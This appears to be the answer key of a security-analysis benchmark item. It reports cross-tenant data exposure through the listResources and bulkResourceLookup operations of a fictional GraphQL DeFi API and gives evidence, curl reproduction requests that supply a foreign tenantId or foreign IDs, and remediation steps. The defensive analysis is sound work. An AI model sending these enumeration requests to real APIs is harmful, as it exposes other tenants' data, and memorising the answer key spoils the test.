# Expected Response

## System
- Domain: Blockchain / DeFi
- System: ChainVault DeFi API
- Example ID: GQL-0035

## Priority Findings

### Finding 1: Over-Broad listResources Endpoint Accepts Attacker-Supplied tenantId — Cross-Tenant Enumeration (Pattern 3.3 — Semantic Ambiguity)
**Severity:** Critical
**Category:** Insecure Design / BAC

**Summary:**
The `listResources` query on `POST /graphql` is over-broad: it accepts a caller-supplied `tenantId` argument and uses it directly as the database filter instead of deriving the tenant scope from the validated JWT. An attacker from `tenant-3c88` passed `tenantId: "tenant-d89f"` and received full records belonging to a separate tenant, including `sensitiveField` and `internalNotes`. The endpoint's semantic design conflates query parameter with authoritative identity, enabling arbitrary cross-tenant enumeration.

**Evidence from HAR:**
- Request: `POST https://api.chainvault-defi-api.example.com/graphql` (2026-04-13T16:22:34Z, 218 ms)
- JWT `x-tenant-id`: `tenant-3c88` — attacker's authenticated identity
- Query payload: `listResources(tenantId: "tenant-d89f") { resourceId ownerId data { sensitiveField } }` — attacker supplies foreign tenantId
- Response HTTP status: `200 OK` — no authorization error
- Response `tenantId`: `tenant-d89f` — cross-tenant data returned to `tenant-3c88`
- Response `ownerId`: `other-user-3c88d89f`
- Response `sensitiveField`: `CONFIDENTIAL-3c88d89f` — sensitive data disclosed
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-3c88d89f`

**Root Cause (§4.0 RISK-GQL-035):** The `getResource`/`listResources` resolver fetches by `resourceId`/tenantId parameter only. "The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." The `listResources` endpoint is over-broad — it accepts the caller's `tenantId` argument as authoritative, creating a semantic ambiguity between query filter and identity scope.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-035 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §3.0 | `listResources` schema | Accepts `tenantId: ID` from caller |
| HAR entry | request.postData | `listResources(tenantId: "tenant-d89f")` from `tenant-3c88` |
| HAR entry | response.content | `tenantId: "tenant-d89f"`, `sensitiveField: "CONFIDENTIAL-3c88d89f"`, `internalNotes: "Internal data exposed"` |

---

### Finding 2: Cross-Tenant Bulk Enumeration via bulkResourceLookup — No Per-ID Ownership Filter (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass Enumeration

**Summary:**
Per §4.0, the `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering. An attacker can supply IDs from any tenant in a single request and receive all matching records across tenant boundaries.

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own tenant)
```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-3c88" \
  -d '{"query": "query { listResources(tenantId: \"tenant-3c88\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns only resources belonging to `tenant-3c88`.

### Step 2 — Cross-tenant enumeration via over-broad endpoint (HAR attack)
```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-3c88" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-d89f\") { resourceId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-d89f"`, `ownerId: "other-user-3c88d89f"`, `sensitiveField: "CONFIDENTIAL-3c88d89f"`, `internalNotes: "Internal data exposed"` — cross-tenant data access confirmed.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"listResources": null}}`.

### Step 3 — Bulk cross-tenant enumeration
```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-3c88" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-d89f-001\", \"R-d89f-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns resources from `tenant-d89f` in a single response.
**Secure outcome:** Only resources belonging to `tenant-3c88` are returned; foreign IDs yield null or FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "listResources": null }
}
```

## Remediation
1. **Remove tenantId from listResources input:** The `tenantId` argument must be removed from the `listResources` query signature or ignored. The resolver MUST extract `tenantId` exclusively from the validated JWT.
2. **Resolver-level tenant guard:** Apply `WHERE tenant_id = $jwt.tenantId` on all resolvers fetching by ID (§4.0 RISK-GQL-035).
3. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, remove any result whose `tenant_id` ≠ JWT's `tenantId`; return FORBIDDEN for disallowed entries.
4. **Redis cache key includes tenantId:** §2.0 notes cache is keyed by `resourceId` only — change to `resourceId:tenantId` to prevent cross-tenant cache reads.
5. **Automated regression tests:** Assert that `tenant-3c88` calling `listResources(tenantId: "tenant-d89f")` receives FORBIDDEN or empty result — never `tenant-d89f` records.
